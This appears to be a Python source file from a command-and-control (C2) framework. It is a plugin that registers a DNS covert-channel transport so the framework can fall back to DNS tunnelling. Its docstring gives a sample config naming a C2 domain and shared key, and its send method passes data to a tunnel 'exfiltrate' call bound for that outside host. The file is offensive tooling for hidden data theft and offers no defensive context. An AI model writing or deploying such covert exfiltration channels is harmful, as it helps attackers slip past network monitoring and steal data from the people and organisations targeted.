"""
DNS tunnel transport — wraps c2/dns_tunnel.py as a transport plugin.

Allows the DNS covert channel to be used as a standard transport method
in the config (``transport.method: "dns"``), enabling it as a fallback
in the transport failover chain.

Usage::

    # config.yaml
    transport:
      method: "dns"
      dns:
        domain: "c2.example.com"
        nameserver: "8.8.8.8"
        shared_key: "hex-encoded-32-byte-key"
"""
from __future__ import annotations

import base64
import logging
from typing import Any

from transport import register_transport
from transport.base import BaseTransport

logger = logging.getLogger(__name__)


@register_transport("dns")
class DNSTransport(BaseTransport):
    """Transport that exfiltrates data via DNS tunnel queries."""

    def __init__(self, config: dict[str, Any]) -> None:
        super().__init__(config)
        self._config = config
        self._tunnel = None

    def connect(self) -> None:
        """Connect the DNS tunnel transport.

        Raises on failure, matching ``BaseTransport.connect() -> None``.
        """
        from c2.dns_tunnel import DNSTunnel
        self._tunnel = DNSTunnel(self._config)
        self._connected = True

    def disconnect(self) -> None:
        if self._tunnel:
            self._tunnel.stop()
        self._tunnel = None
        self._connected = False

    def send(self, data: bytes, metadata: dict[str, Any] | None = None) -> bool:
        if self._tunnel is None:
            try:
                self.connect()
            except Exception as exc:
                logger.debug("DNS transport auto-connect failed: %s", exc)
                return False

        try:
            data_type = (metadata or {}).get("content_type", "application/octet-stream")
            return self._tunnel.exfiltrate(data, data_type=data_type)
        except Exception as exc:
            logger.debug("DNS transport send failed: %s", exc)
            return False
